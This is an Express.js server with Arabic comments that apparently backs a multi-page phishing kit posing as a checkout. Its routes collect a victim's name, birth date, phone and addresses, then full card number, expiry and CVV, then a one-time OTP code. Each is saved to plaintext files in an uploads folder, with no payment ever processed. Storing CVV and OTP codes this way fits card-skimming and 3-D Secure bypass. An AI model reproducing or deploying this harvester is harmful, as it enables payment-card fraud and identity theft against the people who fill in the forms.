const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 8085;

// إعداد السيرفر لقراءة البيانات القادمة من الفورم (POST)
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// جعل المجلد الأساسي يعرض الصفحات الثابتة
app.use(express.static(path.join(__dirname, 'views')));

// التأكد من وجود مجلد uploads
if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
    fs.mkdirSync(path.join(__dirname, 'uploads'));
}

// ============================================
// مسارات عرض الصفحات (GET)
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page3.html'));
});

app.get('/page4', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page4.html'));
});

app.get('/page5', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page5.html'));
});

// ============================================
// مسار استقبال بيانات العنوان من الصفحة الثانية (page2)
// ============================================
app.post('/submit-data', (req, res) => {
    console.log('📥 البيانات المستلمة من الفورم:');
    console.log(req.body); // طباعة كل البيانات عشان نشوفها

    // استقبال بيانات الشحن
    const { 
        username, 
        dob_month, 
        dob_day, 
        dob_year, 
        phone, 
        country, 
        address_line1, 
        address_line2, 
        city, 
        state, 
        zipcode,
        // بيانات الفوترة - استقبل من hidden fields
        billing_username_hidden,
        billing_address_line1_hidden,
        billing_address_line2_hidden,
        billing_city_hidden,
        billing_state_hidden,
        billing_zipcode_hidden,
        billing_phone_hidden
    } = req.body;

    // استخدام الـ hidden fields كبيانات فوترة
    // لو مش موجودة، استخدم الفاضية
    const billing_username = billing_username_hidden || '';
    const billing_address_line1 = billing_address_line1_hidden || '';
    const billing_address_line2 = billing_address_line2_hidden || '';
    const billing_city = billing_city_hidden || '';
    const billing_state = billing_state_hidden || '';
    const billing_zipcode = billing_zipcode_hidden || '';
    const billing_phone = billing_phone_hidden || '';

    // التحقق من البيانات
    console.log('📦 بيانات الشحن:', { username, address_line1, city, state, zipcode });
    console.log('💳 بيانات الفوترة (من hidden):', { billing_username, billing_address_line1, billing_city, billing_state, billing_zipcode });

    // التحقق إذا كانت الفوترة موجودة ولا لأ
    const hasBillingData = billing_username || billing_address_line1 || billing_city || billing_state || billing_zipcode;

    // تحديد إذا كانت الفوترة نفس الشحن
    const isBillingSameAsShipping = (
        hasBillingData &&
        billing_username === username &&
        billing_address_line1 === address_line1 &&
        billing_address_line2 === (address_line2 || '') &&
        billing_city === city &&
        billing_state === (state || '') &&
        billing_zipcode === (zipcode || '') &&
        billing_phone === (phone || '')
    );

    // بناء محتوى الملف
    let logData = `========================================
   بيانات الشحن والعنوان المستلمة
========================================

📦 **بيانات الشحن (Shipping):**
----------------------------------------
الاسم الكامل        : ${username}
تاريخ الميلاد       : ${dob_month}/${dob_day}/${dob_year}
رقم الهاتف          : ${phone}
الدولة/المنطقة      : ${country}
العنوان (سطر 1)     : ${address_line1}
العنوان (سطر 2)     : ${address_line2 || 'غير محدد'}
المدينة             : ${city}
المحافظة/الولاية    : ${state || 'غير محدد'}
الرمز البريدي       : ${zipcode || 'غير محدد'}

💳 **بيانات الفوترة (Billing):**
----------------------------------------`;

    if (!hasBillingData) {
        logData += `
🔄 **لم يتم إدخال عنوان فوترة** (سيتم استخدام عنوان الشحن)
`;
    } else if (isBillingSameAsShipping) {
        logData += `
🔄 **نفس عنوان الشحن** ✅
`;
    } else {
        logData += `
الاسم الكامل        : ${billing_username || 'غير محدد'}
العنوان (سطر 1)     : ${billing_address_line1 || 'غير محدد'}
العنوان (سطر 2)     : ${billing_address_line2 || 'غير محدد'}
المدينة             : ${billing_city || 'غير محدد'}
المحافظة/الولاية    : ${billing_state || 'غير محدد'}
الرمز البريدي       : ${billing_zipcode || 'غير محدد'}
رقم الهاتف          : ${billing_phone || 'غير محدد'}
`;
    }

    logData += `
----------------------------------------
التاريخ والوقت: ${new Date().toLocaleString('ar-EG')}
========================================`;

    // حفظ الملف
    const fileName = path.join(__dirname, 'uploads', `user-${Date.now()}.txt`);

    // استخدام writeFileSync عشان نضمن الكتابة الكاملة
    try {
        fs.writeFileSync(fileName, logData, 'utf8');
        console.log(`[✅] تم حفظ بيانات المستخدم بنجاح: ${fileName}`);
        console.log('📄 محتوى الملف:');
        console.log(logData);
        res.redirect('/page3');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ ملف العنوان:", err);
        return res.status(500).send("حدث خطأ داخلي في السيرفر");
    }
});

// ============================================
// مسار استقبال بيانات الدفع من الصفحة الثالثة (page3)
// ============================================
app.post('/submit-payment', (req, res) => {
    const { card_name, card_number, card_expiry, card_cvv } = req.body;

    const paymentContent = `========================================
       بيانات بطاقة الدفع المستلمة
========================================
اسم صاحب البطاقة: ${card_name}
رقم البطاقة     : ${card_number}
تاريخ الانتهاء   : ${card_expiry}
الرمز السري CVV  : ${card_cvv}
التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
----------------------------------------`;

    const fileName = path.join(__dirname, 'uploads', `card-${Date.now()}.txt`);

    try {
        fs.writeFileSync(fileName, paymentContent, 'utf8');
        console.log(`[💳] تم حفظ بيانات كارت جديدة بنجاح: ${fileName}`);
        res.redirect('/page4');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ بيانات الدفع:", err);
        return res.status(500).send("حدث خطأ في السيرفر أثناء معالجة الدفع");
    }
});

// ============================================
// مسار استقبال الـ OTP من الصفحة الرابعة (page4)
// ============================================
app.post('/submit-otp', (req, res) => {
    const { otp_code } = req.body;

    const otpContent = `========================================
         رمز الـ OTP المستلم
========================================
رمز التحقق (OTP): ${otp_code}
التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
----------------------------------------`;

    const fileName = path.join(__dirname, 'uploads', `otp-${Date.now()}.txt`);

    try {
        fs.writeFileSync(fileName, otpContent, 'utf8');
        console.log(`[🔒] تم حفظ رمز OTP جديد بنجاح: ${fileName}`);
        res.redirect('/page5');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ رمز OTP:", err);
        return res.status(500).send("حدث خطأ في السيرفر أثناء معالجة رمز التحقق");
    }
});

// ============================================
// تشغيل السيرفر
// ============================================
app.listen(PORT, () => {
    console.log(`==================================================`);
    console.log(`[*] السيرفر يعمل الآن على: http://localhost:${PORT}`);
    console.log(`==================================================`);
    console.log(`[📂] مجلد حفظ الملفات: ${path.join(__dirname, 'uploads')}`);
    console.log(`==================================================`);
});
